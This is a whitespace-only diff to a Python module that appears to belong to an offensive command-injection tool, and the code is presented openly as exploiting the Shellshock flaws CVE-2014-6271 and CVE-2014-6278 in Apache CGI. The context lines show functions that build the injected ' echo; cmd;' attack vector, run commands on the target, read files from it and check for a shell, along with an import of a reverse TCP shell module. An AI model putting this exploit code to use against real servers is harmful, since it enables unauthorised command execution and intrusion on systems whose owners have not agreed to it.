@@ -16,7 +16,6 @@ from src.core.shells import reverse_tcp
 from src.core.requests import parameters
 from src.core.injections.controller import checks
 
-
 """
 This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
 [1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
@@ -48,7 +47,6 @@ def shellshock_payloads(cve, attack_vector):
     pass
   return payload
 
-
 """
 Shellshock bug exploitation
 """
@@ -56,7 +54,6 @@ def shellshock_exploitation(cve, cmd):
   attack_vector = " echo; " + cmd + ";"
   payload = shellshock_payloads(cve, attack_vector)
   return payload
-
 
 """
 Enumeration Options
@@ -412,7 +409,7 @@ def file_access(url, cve, check_header, filename):
 
   if settings.FILE_ACCESS_DONE == True:
     print ""
-
+    
 """
 The main shellshock handler
 """
@@ -659,7 +656,6 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       shell = check_for_shell(url, cmd, cve, check_header, filename)
 
   return shell
-
 
 """
 The exploitation function.
